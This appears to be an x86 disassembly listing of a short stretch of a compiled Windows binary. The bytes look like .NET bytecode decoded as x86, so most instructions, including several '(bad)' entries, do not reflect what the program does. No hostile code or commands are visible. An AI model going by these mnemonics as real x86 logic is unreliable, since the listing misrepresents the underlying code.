  403150:	0a 28                	or     (%eax),%ch
  403152:	45                   	inc    %ebp
  403153:	00 00                	add    %al,(%eax)
  403155:	0a de                	or     %dh,%bl
  403157:	00 08                	add    %cl,(%eax)
  403159:	17                   	pop    %ss
  40315a:	58                   	pop    %eax
  40315b:	0c 08                	or     $0x8,%al
  40315d:	07                   	pop    %es
  40315e:	8e 69 3f             	mov    0x3f(%ecx),%gs
  403161:	6c                   	insb   (%dx),%es:(%edi)
  403162:	ff                   	(bad)
  403163:	ff                   	(bad)
  403164:	ff 2a                	ljmp   *(%edx)
  403166:	00 00                	add    %al,(%eax)
  403168:	01 10                	add    %edx,(%eax)
  40316a:	00 00                	add    %al,(%eax)
  40316c:	00 00                	add    %al,(%eax)
  40316e:	21 00                	and    %eax,(%eax)
  403170:	69 8a 00 1a 24 00 00 	imul   $0x301b0100,0x241a00(%edx),%ecx
  403177:	01 1b 30 
  40317a:	04 00                	add    $0x0,%al
  40317c:	b1 00                	mov    $0x0,%cl
  40317e:	00 00                	add    %al,(%eax)
  403180:	19 00                	sbb    %eax,(%eax)
  403182:	00 11                	add    %dl,(%ecx)
  403184:	1d 8d 43 00 00       	sbb    $0x438d,%eax
  403189:	01 25 16 72 8c 02    	add    %esp,0x28c7216
  40318f:	00 70 a2             	add    %dh,-0x5e(%eax)
  403192:	25 17 02 a2 25       	and    $0x25a20217,%eax
  403197:	18 72 35             	sbb    %dh,0x35(%edx)
  40319a:	03 00                	add    (%eax),%eax
  40319c:	70 a2                	jo     0x403140
  40319e:	25 19 03 a2 25       	and    $0x25a20319,%eax
  4031a3:	1a 72 67             	sbb    0x67(%edx),%dh
  4031a6:	03 00                	add    (%eax),%eax
  4031a8:	70 a2                	jo     0x40314c
  4031aa:	25 1b 04 a2 25       	and    $0x25a2041b,%eax
  4031af:	1c 72                	sbb    $0x72,%al
  4031b1:	4c                   	dec    %esp
  4031b2:	09 00                	or     %eax,(%eax)
  4031b4:	70 a2                	jo     0x403158
  4031b6:	28 36                	sub    %dh,(%esi)
  4031b8:	00 00                	add    %al,(%eax)
  4031ba:	0a 0a                	or     (%edx),%cl
  4031bc:	28 37                	sub    %dh,(%edi)
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	0a 72 eb             	or     -0x15(%edx),%dh
  4031c3:	09 00                	or     %eax,(%eax)
  4031c5:	70 28                	jo     0x4031ef
  4031c7:	38 00                	cmp    %al,(%eax)
  4031c9:	00 0a                	add    %cl,(%edx)
  4031cb:	0c 12                	or     $0x12,%al
  4031cd:	02 72 4a             	add    0x4a(%edx),%dh
  4031d0:	04 00                	add    $0x0,%al
  4031d2:	70 28                	jo     0x4031fc
  4031d4:	39 00                	cmp    %eax,(%eax)
  4031d6:	00 0a                	add    %cl,(%edx)
  4031d8:	72 4e                	jb     0x403228
  4031da:	04 00                	add    $0x0,%al
  4031dc:	70 28                	jo     0x403206
  4031de:	3a 00                	cmp    (%eax),%al
  4031e0:	00 0a                	add    %cl,(%edx)
  4031e2:	28 31                	sub    %dh,(%ecx)
  4031e4:	00 00                	add    %al,(%eax)
  4031e6:	0a 0b                	or     (%ebx),%cl
  4031e8:	07                   	pop    %es
  4031e9:	06                   	push   %es
  4031ea:	28 3b                	sub    %bh,(%ebx)
  4031ec:	00 00                	add    %al,(%eax)
  4031ee:	0a 72 58             	or     0x58(%edx),%dh
  4031f1:	04 00                	add    $0x0,%al
  4031f3:	70 72                	jo     0x403267
  4031f5:	68 04 00 70 07       	push   $0x7700004
  4031fa:	72 68                	jb     0x403264
  4031fc:	04 00                	add    $0x0,%al
  4031fe:	70 28                	jo     0x403228
  403200:	3a 00                	cmp    (%eax),%al
  403202:	00 0a                	add    %cl,(%edx)
  403204:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  403207:	00 0a                	add    %cl,(%edx)
  403209:	26 20 2c 01          	and    %ch,%es:(%ecx,%eax,1)
  40320d:	00 00                	add    %al,(%eax)
  40320f:	28 2b                	sub    %ch,(%ebx)
  403211:	00 00                	add    %al,(%eax)
  403213:	0a 07                	or     (%edi),%al
  403215:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  40321b:	18 0d 72 f5 09 00    	sbb    %cl,0x9f572
  403221:	70 09                	jo     0x40322c
  403223:	6f                   	outsl  %ds:(%esi),(%dx)
  403224:	50                   	push   %eax
  403225:	00 00                	add    %al,(%eax)
  403227:	0a 28                	or     (%eax),%ch
  403229:	4d                   	dec    %ebp
  40322a:	00 00                	add    %al,(%eax)
  40322c:	0a 28                	or     (%eax),%ch
  40322e:	45                   	inc    %ebp
  40322f:	00 00                	add    %al,(%eax)
  403231:	0a de                	or     %dh,%bl
  403233:	00 2a                	add    %ch,(%edx)
  403235:	00 00                	add    %al,(%eax)
  403237:	00 01                	add    %al,(%ecx)
  403239:	10 00                	adc    %al,(%eax)
  40323b:	00 00                	add    %al,(%eax)
  40323d:	00 00                	add    %al,(%eax)
  40323f:	00 98 98 00 18 24    	add    %bl,0x24180098(%eax)
  403245:	00 00                	add    %al,(%eax)
  403247:	01 1e                	add    %ebx,(%esi)
  403249:	02 28                	add    (%eax),%ch
  40324b:	93                   	xchg   %eax,%ebx
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 2a                	or     (%edx),%ch
  403250:	36 02 7b 13          	add    %ss:0x13(%ebx),%bh
  403254:	00 00                	add    %al,(%eax)
  403256:	04 03                	add    $0x3,%al
  403258:	6f                   	outsl  %ds:(%esi),(%dx)
  403259:	20 00                	and    %al,(%eax)
  40325b:	00 0a                	add    %cl,(%edx)
  40325d:	2a 2e                	sub    (%esi),%ch
  40325f:	73 31                	jae    0x403292
  403261:	00 00                	add    %al,(%eax)
  403263:	06                   	push   %es
  403264:	80 14 00 00          	adcb   $0x0,(%eax,%eax,1)
  403268:	04 2a                	add    $0x2a,%al
  40326a:	1e                   	push   %ds
  40326b:	02 28                	add    (%eax),%ch
  40326d:	93                   	xchg   %eax,%ebx
  40326e:	00 00                	add    %al,(%eax)
  403270:	0a 2a                	or     (%edx),%ch
  403272:	1a 28                	sbb    (%eax),%ch
  403274:	0d 00 00 06 2a       	or     $0x2a060000,%eax
  403279:	1e                   	push   %ds
  40327a:	02 28                	add    (%eax),%ch
  40327c:	93                   	xchg   %eax,%ebx
  40327d:	00 00                	add    %al,(%eax)
  40327f:	0a 2a                	or     (%edx),%ch
  403281:	00 00                	add    %al,(%eax)
  403283:	00 1b                	add    %bl,(%ebx)
  403285:	30 04 00             	xor    %al,(%eax,%eax,1)
  403288:	50                   	push   %eax
  403289:	01 00                	add    %eax,(%eax)
  40328b:	00 1a                	add    %bl,(%edx)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	11 73 94             	adc    %esi,-0x6c(%ebx)
  403292:	00 00                	add    %al,(%eax)
  403294:	0a 25 72 17 0a 00    	or     0xa1772,%ah
  40329a:	70 6f                	jo     0x40330b
  40329c:	95                   	xchg   %eax,%ebp
  40329d:	00 00                	add    %al,(%eax)
  40329f:	0a 25 72 5b 0a 00    	or     0xa5b72,%ah
  4032a5:	70 6f                	jo     0x403316
  4032a7:	96                   	xchg   %eax,%esi
  4032a8:	00 00                	add    %al,(%eax)
  4032aa:	0a 25 19 6f 97 00    	or     0x976f19,%ah
  4032b0:	00 0a                	add    %cl,(%edx)
  4032b2:	25 17 6f 98 00       	and    $0x986f17,%eax
  4032b7:	00 0a                	add    %cl,(%edx)
  4032b9:	25 1c 6f 99 00       	and    $0x996f1c,%eax
  4032be:	00 0a                	add    %cl,(%edx)
  4032c0:	25 23 00 00 00       	and    $0x23,%eax
  4032c5:	00 00                	add    %al,(%eax)
  4032c7:	00 24 40             	add    %ah,(%eax,%eax,2)
  4032ca:	28 9a 00 00 0a 6f    	sub    %bl,0x6f0a0000(%edx)
  4032d0:	9b                   	fwait
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 0a                	or     (%edx),%cl
  4032d5:	72 75                	jb     0x40334c
  4032d7:	0a 00                	or     (%eax),%al
  4032d9:	70 02                	jo     0x4032dd
  4032db:	7b 16                	jnp    0x4032f3
  4032dd:	00 00                	add    %al,(%eax)
  4032df:	04 72                	add    $0x72,%al
  4032e1:	7b 0a                	jnp    0x4032ed
  4032e3:	00 70 28             	add    %dh,0x28(%eax)
  4032e6:	3a 00                	cmp    (%eax),%al
  4032e8:	00 0a                	add    %cl,(%edx)
  4032ea:	06                   	push   %es
  4032eb:	73 9c                	jae    0x403289
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	0a 0b                	or     (%ebx),%cl
  4032f1:	07                   	pop    %es
  4032f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f3:	9d                   	popf
  4032f4:	00 00                	add    %al,(%eax)
  4032f6:	0a 07                	or     (%edi),%al
  4032f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f9:	9e                   	sahf
  4032fa:	00 00                	add    %al,(%eax)
  4032fc:	0a 2d 1a 72 93 0a    	or     0xa93721a,%ch
  403302:	00 70 02             	add    %dh,0x2(%eax)
  403305:	7b 16                	jnp    0x40331d
  403307:	00 00                	add    %al,(%eax)
  403309:	04 28                	add    $0x28,%al
  40330b:	4d                   	dec    %ebp
  40330c:	00 00                	add    %al,(%eax)
  40330e:	0a 28                	or     (%eax),%ch
  403310:	45                   	inc    %ebp
  403311:	00 00                	add    %al,(%eax)
  403313:	0a dd                	or     %ch,%bl
  403315:	c6 00 00             	movb   $0x0,(%eax)
  403318:	00 07                	add    %al,(%edi)
  40331a:	72 df                	jb     0x4032fb
  40331c:	0a 00                	or     (%eax),%al
  40331e:	70 73                	jo     0x403393
  403320:	9f                   	lahf
  403321:	00 00                	add    %al,(%eax)
  403323:	0a 14 73             	or     (%ebx,%esi,2),%dl
  403326:	a0 00 00 0a 0c       	mov    0xc0a0000,%al
  40332b:	08 72 fb             	or     %dh,-0x5(%edx)
  40332e:	0a 00                	or     (%eax),%al
  403330:	70 6f                	jo     0x4033a1
  403332:	a1 00 00 0a 0d       	mov    0xd0a0000,%eax
  403337:	09 72 09             	or     %esi,0x9(%edx)
  40333a:	0b 00                	or     (%eax),%eax
  40333c:	70 02                	jo     0x403340
  40333e:	7b 17                	jnp    0x403357
  403340:	00 00                	add    %al,(%eax)
  403342:	04 6f                	add    $0x6f,%al
  403344:	a2 00 00 0a 08       	mov    %al,0x80a0000
  403349:	72 fb                	jb     0x403346
  40334b:	0a 00                	or     (%eax),%al
  40334d:	70 09                	jo     0x403358
  40334f:	14 6f                	adc    $0x6f,%al
  403351:	a3 00 00 0a 6f       	mov    %eax,0x6f0a0000
  403356:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403357:	00 00                	add    %al,(%eax)
  403359:	0a 72 21             	or     0x21(%edx),%dh
  40335c:	0b 00                	or     (%eax),%eax
  40335e:	70 6f                	jo     0x4033cf
  403360:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 6f a6             	or     -0x5a(%edi),%ch
  403366:	00 00                	add    %al,(%eax)
  403368:	0a a5 72 00 00 01    	or     0x1000072(%ebp),%ah
  40336e:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403371:	04 2d                	add    $0x2d,%al
  403373:	17                   	pop    %ss
  403374:	72 39                	jb     0x4033af
  403376:	0b 00                	or     (%eax),%eax
  403378:	70 02                	jo     0x40337c
  40337a:	7b 16                	jnp    0x403392
  40337c:	00 00                	add    %al,(%eax)
  40337e:	04 28                	add    $0x28,%al
  403380:	4d                   	dec    %ebp
  403381:	00 00                	add    %al,(%eax)
  403383:	0a 28                	or     (%eax),%ch
  403385:	45                   	inc    %ebp
  403386:	00 00                	add    %al,(%eax)
  403388:	0a 2b                	or     (%ebx),%ch
  40338a:	21 72 8b             	and    %esi,-0x75(%edx)
  40338d:	0b 00                	or     (%eax),%eax
  40338f:	70 02                	jo     0x403393
  403391:	7b 16                	jnp    0x4033a9
  403393:	00 00                	add    %al,(%eax)
  403395:	04 72                	add    $0x72,%al
  403397:	db 0b                	fisttpl (%ebx)
  403399:	00 70 12             	add    %dh,0x12(%eax)
  40339c:	04 28                	add    $0x28,%al
  40339e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	0a 28                	or     (%eax),%ch
  4033a3:	a8 00                	test   $0x0,%al
  4033a5:	00 0a                	add    %cl,(%edx)
  4033a7:	28 45 00             	sub    %al,0x0(%ebp)
  4033aa:	00 0a                	add    %cl,(%edx)
  4033ac:	de 0a                	fimuls (%edx)
  4033ae:	08 2c 06             	or     %ch,(%esi,%eax,1)
  4033b1:	08 6f 22             	or     %ch,0x22(%edi)
  4033b4:	00 00                	add    %al,(%eax)
  4033b6:	0a dc                	or     %ah,%bl
  4033b8:	de 25 13 05 72 f3    	fisubs 0xf3720513
  4033be:	0b 00                	or     (%eax),%eax
  4033c0:	70 02                	jo     0x4033c4
  4033c2:	7b 16                	jnp    0x4033da
  4033c4:	00 00                	add    %al,(%eax)
  4033c6:	04 72                	add    $0x72,%al
  4033c8:	49                   	dec    %ecx
  4033c9:	0c 00                	or     $0x0,%al
  4033cb:	70 11                	jo     0x4033de
  4033cd:	05 6f 50 00 00       	add    $0x506f,%eax
  4033d2:	0a 28                	or     (%eax),%ch
  4033d4:	a8 00                	test   $0x0,%al
  4033d6:	00 0a                	add    %cl,(%edx)
  4033d8:	28 45 00             	sub    %al,0x0(%ebp)
  4033db:	00 0a                	add    %cl,(%edx)
  4033dd:	de 00                	fiadds (%eax)
  4033df:	2a 41 34             	sub    0x34(%ecx),%al
  4033e2:	00 00                	add    %al,(%eax)
  4033e4:	02 00                	add    (%eax),%al
  4033e6:	00 00                	add    %al,(%eax)
  4033e8:	9b                   	fwait
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	00 83 00 00 00 1e    	add    %al,0x1e000000(%ebx)
  4033f1:	01 00                	add    %eax,(%eax)
  4033f3:	00 0a                	add    %cl,(%edx)
	...
  403401:	00 00                	add    %al,(%eax)
  403403:	00 2a                	add    %ch,(%edx)
  403405:	01 00                	add    %eax,(%eax)
  403407:	00 2a                	add    %ch,(%edx)
  403409:	01 00                	add    %eax,(%eax)
  40340b:	00 25 00 00 00 24    	add    %ah,0x24000000
  403411:	00 00                	add    %al,(%eax)
  403413:	01 1e                	add    %ebx,(%esi)
  403415:	02 28                	add    (%eax),%ch
  403417:	93                   	xchg   %eax,%ebx
  403418:	00 00                	add    %al,(%eax)
  40341a:	0a 2a                	or     (%edx),%ch
  40341c:	1e                   	push   %ds
  40341d:	02 28                	add    (%eax),%ch
  40341f:	93                   	xchg   %eax,%ebx
  403420:	00 00                	add    %al,(%eax)
  403422:	0a 2a                	or     (%edx),%ch
  403424:	13 30                	adc    (%eax),%esi
  403426:	02 00                	add    (%eax),%al
  403428:	37                   	aaa
  403429:	00 00                	add    %al,(%eax)
  40342b:	00 1b                	add    %bl,(%ebx)
  40342d:	00 00                	add    %al,(%eax)
  40342f:	11 12                	adc    %edx,(%edx)
  403431:	00 28                	add    %ch,(%eax)
  403433:	3e 00 00             	add    %al,%ds:(%eax)
  403436:	0a 7d 44             	or     0x44(%ebp),%bh
  403439:	00 00                	add    %al,(%eax)
  40343b:	04 12                	add    $0x12,%al
  40343d:	00 02                	add    %al,(%edx)
  40343f:	7d 45                	jge    0x403486
  403441:	00 00                	add    %al,(%eax)
  403443:	04 12                	add    $0x12,%al
  403445:	00 15 7d 43 00 00    	add    %dl,0x437d
  40344b:	04 12                	add    $0x12,%al
  40344d:	00 7c 44 00          	add    %bh,0x0(%esp,%eax,2)
  403451:	00 04 12             	add    %al,(%edx,%edx,1)
  403454:	00 28                	add    %ch,(%eax)
  403456:	07                   	pop    %es
  403457:	00 00                	add    %al,(%eax)
  403459:	2b 12                	sub    (%edx),%edx
  40345b:	00 7c 44 00          	add    %bh,0x0(%esp,%eax,2)
  40345f:	00 04 28             	add    %al,(%eax,%ebp,1)
  403462:	40                   	inc    %eax
  403463:	00 00                	add    %al,(%eax)
  403465:	0a 2a                	or     (%edx),%ch
  403467:	00 1b                	add    %bl,(%ebx)
  403469:	30 04 00             	xor    %al,(%eax,%eax,1)
  40346c:	13 01                	adc    (%ecx),%eax
  40346e:	00 00                	add    %al,(%eax)
  403470:	1c 00                	sbb    $0x0,%al
  403472:	00 11                	add    %dl,(%ecx)
  403474:	02 7b 1c             	add    0x1c(%ebx),%bh
  403477:	00 00                	add    %al,(%eax)
  403479:	04 0a                	add    $0xa,%al
  40347b:	06                   	push   %es
  40347c:	26 00 06             	add    %al,%es:(%esi)
  40347f:	2c 0b                	sub    $0xb,%al
  403481:	02 73 a9             	add    -0x57(%ebx),%dh
  403484:	00 00                	add    %al,(%eax)
  403486:	0a 7d 21             	or     0x21(%ebp),%bh
  403489:	00 00                	add    %al,(%eax)
  40348b:	04 00                	add    $0x0,%al
  40348d:	06                   	push   %es
  40348e:	2c 71                	sub    $0x71,%al
  403490:	02 02                	add    (%edx),%al
  403492:	7b 21                	jnp    0x4034b5
  403494:	00 00                	add    %al,(%eax)
  403496:	04 02                	add    $0x2,%al
  403498:	7b 1e                	jnp    0x4034b8
  40349a:	00 00                	add    %al,(%eax)
  40349c:	04 02                	add    $0x2,%al
  40349e:	7b 1f                	jnp    0x4034bf
  4034a0:	00 00                	add    %al,(%eax)
  4034a2:	04 6f                	add    $0x6f,%al
  4034a4:	aa                   	stos   %al,%es:(%edi)
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	0a 7d 22             	or     0x22(%ebp),%bh
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	04 18                	add    $0x18,%al
  4034ae:	8d 1e                	lea    (%esi),%ebx
  4034b0:	00 00                	add    %al,(%eax)
  4034b2:	01 25 16 02 7b 22    	add    %esp,0x227b0216
  4034b8:	00 00                	add    %al,(%eax)
  4034ba:	04 a2                	add    $0xa2,%al
  4034bc:	25 17 02 7b 20       	and    $0x207b0217,%eax
  4034c1:	00 00                	add    %al,(%eax)
  4034c3:	04 28                	add    $0x28,%al
  4034c5:	ab                   	stos   %eax,%es:(%edi)
  4034c6:	00 00                	add    %al,(%eax)
  4034c8:	0a a2 28 ac 00 00    	or     0xac28(%edx),%ah
  4034ce:	0a 6f ad             	or     -0x53(%edi),%ch
  4034d1:	00 00                	add    %al,(%eax)
  4034d3:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4034d6:	02 28                	add    (%eax),%ch
  4034d8:	ae                   	scas   %es:(%edi),%al
  4034d9:	00 00                	add    %al,(%eax)
  4034db:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  4034e1:	0a 7d 1c             	or     0x1c(%ebp),%bh
  4034e4:	00 00                	add    %al,(%eax)
  4034e6:	04 02                	add    $0x2,%al
  4034e8:	08 7d 23             	or     %bh,0x23(%ebp)
  4034eb:	00 00                	add    %al,(%eax)
  4034ed:	04 02                	add    $0x2,%al
  4034ef:	7c 1d                	jl     0x40350e
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	04 12                	add    $0x12,%al
  4034f5:	02 02                	add    (%edx),%al
  4034f7:	28 08                	sub    %cl,(%eax)
  4034f9:	00 00                	add    %al,(%eax)
  4034fb:	2b dd                	sub    %ebp,%ebx
  4034fd:	85 00                	test   %eax,(%eax)
  4034ff:	00 00                	add    %al,(%eax)
  403501:	02 7b 23             	add    0x23(%ebx),%bh
  403504:	00 00                	add    %al,(%eax)
  403506:	04 0c                	add    $0xc,%al
  403508:	02 7c 23 00          	add    0x0(%ebx,%eiz,1),%bh
  40350c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40350f:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403514:	02 15 25 0a 7d 1c    	add    0x1c7d0a25,%dl
  40351a:	00 00                	add    %al,(%eax)
  40351c:	04 12                	add    $0x12,%al
  40351e:	02 28                	add    (%eax),%ch
  403520:	b0 00                	mov    $0x0,%al
  403522:	00 0a                	add    %cl,(%edx)
  403524:	02 7b 22             	add    0x22(%ebx),%bh
  403527:	00 00                	add    %al,(%eax)
  403529:	04 33                	add    $0x33,%al
  40352b:	0e                   	push   %cs
  40352c:	02 7b 21             	add    0x21(%ebx),%bh
  40352f:	00 00                	add    %al,(%eax)
  403531:	04 6f                	add    $0x6f,%al
  403533:	b1 00                	mov    $0x0,%cl
  403535:	00 0a                	add    %cl,(%edx)
  403537:	0b de                	or     %esi,%ebx
  403539:	38 16                	cmp    %dl,(%esi)
  40353b:	0b de                	or     %esi,%ebx
  40353d:	34 06                	xor    $0x6,%al
  40353f:	16                   	push   %ss
  403540:	2f                   	das
  403541:	13 02                	adc    (%edx),%eax
  403543:	7b 21                	jnp    0x403566
  403545:	00 00                	add    %al,(%eax)
  403547:	04 2c                	add    $0x2c,%al
  403549:	0b 02                	or     (%edx),%eax
  40354b:	7b 21                	jnp    0x40356e
  40354d:	00 00                	add    %al,(%eax)
  40354f:	04 6f                	add    $0x6f,%al
  403551:	22 00                	and    (%eax),%al
  403553:	00 0a                	add    %cl,(%edx)
  403555:	dc 26                	fsubl  (%esi)
  403557:	16                   	push   %ss
  403558:	0b de                	or     %esi,%ebx
  40355a:	17                   	pop    %ss
  40355b:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  403560:	1c 00                	sbb    $0x0,%al
  403562:	00 04 02             	add    %al,(%edx,%eax,1)
  403565:	7c 1d                	jl     0x403584
  403567:	00 00                	add    %al,(%eax)
  403569:	04 09                	add    $0x9,%al
  40356b:	28 b2 00 00 0a de    	sub    %dh,-0x21f60000(%edx)
  403571:	14 02                	adc    $0x2,%al
  403573:	1f                   	pop    %ds
  403574:	fe                   	(bad)
  403575:	7d 1c                	jge    0x403593
  403577:	00 00                	add    %al,(%eax)
  403579:	04 02                	add    $0x2,%al
  40357b:	7c 1d                	jl     0x40359a
  40357d:	00 00                	add    %al,(%eax)
  40357f:	04 07                	add    $0x7,%al
  403581:	28 b3 00 00 0a 2a    	sub    %dh,0x2a0a0000(%ebx)
  403587:	00 01                	add    %al,(%ecx)
  403589:	28 00                	sub    %al,(%eax)
  40358b:	00 02                	add    %al,(%edx)
  40358d:	00 19                	add    %bl,(%ecx)
  40358f:	00 b1 ca 00 18 00    	add    %dh,0x1800ca(%ecx)
  403595:	00 00                	add    %al,(%eax)
  403597:	00 00                	add    %al,(%eax)
  403599:	00 0a                	add    %cl,(%edx)
  40359b:	00 d8                	add    %bl,%al
  40359d:	e2 00                	loop   0x40359f
  40359f:	05 13 00 00 01       	add    $0x1000013,%eax
  4035a4:	00 00                	add    %al,(%eax)
  4035a6:	07                   	pop    %es
  4035a7:	00 e0                	add    %ah,%al
  4035a9:	e7 00                	out    %eax,$0x0
  4035ab:	17                   	pop    %ss
  4035ac:	24 00                	and    $0x0,%al
  4035ae:	00 01                	add    %al,(%ecx)
  4035b0:	36 02 7c 1d 00       	add    %ss:0x0(%ebp,%ebx,1),%bh
  4035b5:	00 04 03             	add    %al,(%ebx,%eax,1)
  4035b8:	28 b4 00 00 0a 2a 00 	sub    %dh,0x2a0a00(%eax,%eax,1)
  4035bf:	00 1b                	add    %bl,(%ebx)
  4035c1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035c4:	5e                   	pop    %esi
  4035c5:	02 00                	add    (%eax),%al
  4035c7:	00 1d 00 00 11 02    	add    %bl,0x2110000
  4035cd:	7b 24                	jnp    0x4035f3
  4035cf:	00 00                	add    %al,(%eax)
  4035d1:	04 0a                	add    $0xa,%al
  4035d3:	06                   	push   %es
  4035d4:	39 25 01 00 00 06    	cmp    %esp,0x6000001
  4035da:	17                   	pop    %ss
  4035db:	3b c6                	cmp    %esi,%eax
  4035dd:	01 00                	add    %eax,(%eax)
  4035df:	00 02                	add    %al,(%edx)
  4035e1:	73 35                	jae    0x403618
  4035e3:	00 00                	add    %al,(%eax)
  4035e5:	06                   	push   %es
  4035e6:	7d 26                	jge    0x40360e
  4035e8:	00 00                	add    %al,(%eax)
  4035ea:	04 7e                	add    $0x7e,%al
  4035ec:	15 00 00 04 25       	adc    $0x25040000,%eax
  4035f1:	2d 17 26 7e 14       	sub    $0x147e2617,%eax
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	04 fe                	add    $0xfe,%al
  4035fa:	06                   	push   %es
  4035fb:	32 00                	xor    (%eax),%al
  4035fd:	00 06                	add    %al,(%esi)
  4035ff:	73 b5                	jae    0x4035b6
  403601:	00 00                	add    %al,(%eax)
  403603:	0a 25 80 15 00 00    	or     0x1580,%ah
  403609:	04 28                	add    $0x28,%al
  40360b:	b6 00                	mov    $0x0,%dh
  40360d:	00 0a                	add    %cl,(%edx)
  40360f:	26 02 7b 26          	add    %es:0x26(%ebx),%bh
  403613:	00 00                	add    %al,(%eax)
  403615:	04 28                	add    $0x28,%al
  403617:	2e 00 00             	add    %al,%cs:(%eax)
  40361a:	0a 6f 2f             	or     0x2f(%edi),%ch
  40361d:	00 00                	add    %al,(%eax)
  40361f:	0a 6f 30             	or     0x30(%edi),%ch
  403622:	00 00                	add    %al,(%eax)
  403624:	0a 7d 18             	or     0x18(%ebp),%bh
  403627:	00 00                	add    %al,(%eax)
  403629:	04 02                	add    $0x2,%al
  40362b:	28 0f                	sub    %cl,(%edi)
  40362d:	00 00                	add    %al,(%eax)
  40362f:	06                   	push   %es
  403630:	7d 28                	jge    0x40365a
  403632:	00 00                	add    %al,(%eax)
  403634:	04 02                	add    $0x2,%al
  403636:	7b 28                	jnp    0x403660
  403638:	00 00                	add    %al,(%eax)
  40363a:	04 2d                	add    $0x2d,%al
  40363c:	0f 72                	(bad)
  40363e:	4f                   	dec    %edi
  40363f:	0c 00                	or     $0x0,%al
  403641:	70 28                	jo     0x40366b
  403643:	45                   	inc    %ebp
  403644:	00 00                	add    %al,(%eax)
  403646:	0a dd                	or     %ch,%bl
  403648:	b5 01                	mov    $0x1,%ch
  40364a:	00 00                	add    %al,(%eax)
  40364c:	02 7b 26             	add    0x26(%ebx),%bh
  40364f:	00 00                	add    %al,(%eax)
  403651:	04 1f                	add    $0x1f,%al
  403653:	32 73 b7             	xor    -0x49(%ebx),%dh
  403656:	00 00                	add    %al,(%eax)
  403658:	0a 7d 19             	or     0x19(%ebp),%bh
  40365b:	00 00                	add    %al,(%eax)
  40365d:	04 02                	add    $0x2,%al
  40365f:	73 b8                	jae    0x403619
  403661:	00 00                	add    %al,(%eax)
  403663:	0a 7d 29             	or     0x29(%ebp),%bh
  403666:	00 00                	add    %al,(%eax)
  403668:	04 02                	add    $0x2,%al
  40366a:	17                   	pop    %ss
  40366b:	7d 2a                	jge    0x403697
  40366d:	00 00                	add    %al,(%eax)
  40366f:	04 38                	add    $0x38,%al
  403671:	e4 00                	in     $0x0,%al
  403673:	00 00                	add    %al,(%eax)
  403675:	02 73 36             	add    0x36(%ebx),%dh
  403678:	00 00                	add    %al,(%eax)
  40367a:	06                   	push   %es
  40367b:	7d 27                	jge    0x4036a4
  40367d:	00 00                	add    %al,(%eax)
  40367f:	04 02                	add    $0x2,%al
  403681:	7b 27                	jnp    0x4036aa
  403683:	00 00                	add    %al,(%eax)
  403685:	04 02                	add    $0x2,%al
  403687:	7b 26                	jnp    0x4036af
  403689:	00 00                	add    %al,(%eax)
  40368b:	04 7d                	add    $0x7d,%al
  40368d:	1b 00                	sbb    (%eax),%eax
  40368f:	00 04 02             	add    %al,(%edx,%eax,1)
  403692:	7b 27                	jnp    0x4036bb
  403694:	00 00                	add    %al,(%eax)
  403696:	04 72                	add    $0x72,%al
  403698:	8b 0c 00             	mov    (%eax,%eax,1),%ecx
  40369b:	70 02                	jo     0x40369f
  40369d:	7b 28                	jnp    0x4036c7
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	04 02                	add    $0x2,%al
  4036a3:	7b 2a                	jnp    0x4036cf
  4036a5:	00 00                	add    %al,(%eax)
  4036a7:	04 8c                	add    $0x8c,%al
  4036a9:	49                   	dec    %ecx
  4036aa:	00 00                	add    %al,(%eax)
  4036ac:	01 28                	add    %ebp,(%eax)
  4036ae:	b9 00 00 0a 7d       	mov    $0x7d0a0000,%ecx
  4036b3:	1a 00                	sbb    (%eax),%al
  4036b5:	00 04 02             	add    %al,(%edx,%eax,1)
  4036b8:	7b 27                	jnp    0x4036e1
  4036ba:	00 00                	add    %al,(%eax)
  4036bc:	04 7b                	add    $0x7b,%al
  4036be:	1b 00                	sbb    (%eax),%eax
  4036c0:	00 04 7b             	add    %al,(%ebx,%edi,2)
  4036c3:	19 00                	sbb    %eax,(%eax)
  4036c5:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4036c8:	ba 00 00 0a 6f       	mov    $0x6f0a0000,%edx
  4036cd:	bb 00 00 0a 0b       	mov    $0xb0a0000,%ebx
  4036d2:	12 01                	adc    (%ecx),%al
  4036d4:	28 bc 00 00 0a 2d 3f 	sub    %bh,0x3f2d0a00(%eax,%eax,1)
  4036db:	02 16                	add    (%esi),%dl
  4036dd:	25 0a 7d 24 00       	and    $0x247d0a,%eax
  4036e2:	00 04 02             	add    %al,(%edx,%eax,1)
  4036e5:	07                   	pop    %es
  4036e6:	7d 2b                	jge    0x403713
  4036e8:	00 00                	add    %al,(%eax)
  4036ea:	04 02                	add    $0x2,%al
  4036ec:	7c 25                	jl     0x403713
  4036ee:	00 00                	add    %al,(%eax)
  4036f0:	04 12                	add    $0x12,%al
  4036f2:	01 02                	add    %eax,(%edx)
  4036f4:	28 09                	sub    %cl,(%ecx)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	2b dd                	sub    %ebp,%ebx
  4036fa:	2b 01                	sub    (%ecx),%eax
  4036fc:	00 00                	add    %al,(%eax)
  4036fe:	02 7b 2b             	add    0x2b(%ebx),%bh
